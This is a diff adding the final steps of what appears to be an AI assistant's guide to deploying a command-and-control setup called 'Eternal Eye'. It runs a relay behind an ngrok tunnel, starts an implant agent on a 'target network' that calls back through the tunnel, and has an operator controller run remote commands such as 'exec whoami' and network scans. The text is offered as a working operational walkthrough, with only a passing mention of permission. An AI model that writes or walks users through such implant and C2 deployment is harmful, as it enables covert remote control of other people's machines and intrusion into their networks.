@@ -1,0 +1,53 @@
+Step 8: RUN IT! 🚀
+
+```bash
+# 1. Install ngrok and authenticate (if first time)
+ngrok authtoken YOUR_AUTH_TOKEN  # Get from https://dashboard.ngrok.com
+
+# 2. Run the complete setup
+python3 start_eternal_eye.py
+```
+
+Step 9: Test the System
+
+In Terminal 1 (Relay + Ngrok):
+
+```bash
+python3 start_eternal_eye.py
+```
+
+In Terminal 2 (Implant - ON TARGET NETWORK WITH PERMISSION):
+
+```bash
+# Use the implant connection info from the ngrok output
+python3 implant/agent.py --relay YOUR_NGROK_HOST --port YOUR_NGROK_PORT
+```
+
+In Terminal 3 (Controller):
+
+```bash
+# Use the operator connection info from the ngrok output  
+python3 controller/client.py --relay YOUR_NGROK_HOST --port YOUR_NGROK_PORT
+```
+
+Step 10: Try These Commands in Controller:
+
+```
+list
+use 1
+exec whoami
+exec ip addr
+scan 127.0.0.1
+info
+```
+
+🎯 What You'll See:
+
+1. Ngrok gives you public URLs that route to your local relay
+2. Implants connect through ngrok tunnel
+3. You control everything through the operator interface
+4. Persistent connectivity even when you change networks
+
+The ngrok tunnels will look like: 0.tcp.ngrok.io:12345 - these are your public endpoints that both implants and operators can connect to!
+
+Want me to walk through any specific part or troubleshoot the setup?
